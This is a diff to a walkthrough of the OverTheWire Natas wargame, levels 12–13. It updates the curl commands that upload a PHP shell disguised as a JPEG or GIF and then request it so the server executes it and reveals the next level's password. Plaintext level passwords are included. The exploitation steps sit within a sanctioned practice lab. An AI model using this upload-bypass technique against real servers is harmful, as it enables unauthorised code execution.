@@ -459,10 +459,10 @@ Verification rule used throughout: a password is accepted only if a request to
    ```
    curl -s -u natas12:<pw> -F 'filename=shell.php' -F 'uploadedfile=@/tmp/n12shell.php;type=image/jpeg' http://natas12.natas.labs.overthewire.org/index.php
    ```
-   The response contains the stored path, e.g. `upload/t7fve9ekok.php`; the recording extracts it with `grep -o 'upload/[a-z0-9]*\.php'`.
+   The response contains the stored path (`upload/9jfrl8ytt3.php` in this run); the command captures it into `$P` with `grep -o 'upload/[a-z0-9]*\.php'`.
 4. **Request the uploaded file.** The web server executes `.php` files, so the code runs with the web server's privileges and prints the password:
    ```
-   curl -s -u natas12:<pw> http://natas12.natas.labs.overthewire.org/upload/t7fve9ekok.php
+   curl -s -u natas12:<pw> "http://natas12.natas.labs.overthewire.org/$P"
    ```
 5. **Verify.** `curl -u natas13:g8ba0olAzaSJuyS4gnmbdVVigAICLG1k http://natas13.natas.labs.overthewire.org/` → HTTP 200.
 - **Password for natas13:** `g8ba0olAzaSJuyS4gnmbdVVigAICLG1k`
@@ -502,10 +502,10 @@ Verification rule used throughout: a password is accepted only if a request to
    ```
    curl -s -u natas13:<pw> -F 'filename=shell.php' -F 'uploadedfile=@/tmp/n13shell.php;type=image/gif' http://natas13.natas.labs.overthewire.org/index.php
    ```
-   The stored path this run is `upload/up58risls8.php`.
+   The stored path this run is `upload/j4s3gicm9m.php` (captured into `$P`).
 5. **Request the stored file.** PHP ignores the leading GIF bytes (they are output, harmless) and executes the `<?php ... ?>` that follows:
    ```
-   curl -s -u natas13:<pw> http://natas13.natas.labs.overthewire.org/upload/up58risls8.php
+   curl -s -u natas13:<pw> "http://natas13.natas.labs.overthewire.org/$P"
    ```
 6. **Verify.** `curl -u natas14:A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8 http://natas14.natas.labs.overthewire.org/` → HTTP 200.
 - **Password for natas14:** `A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8`
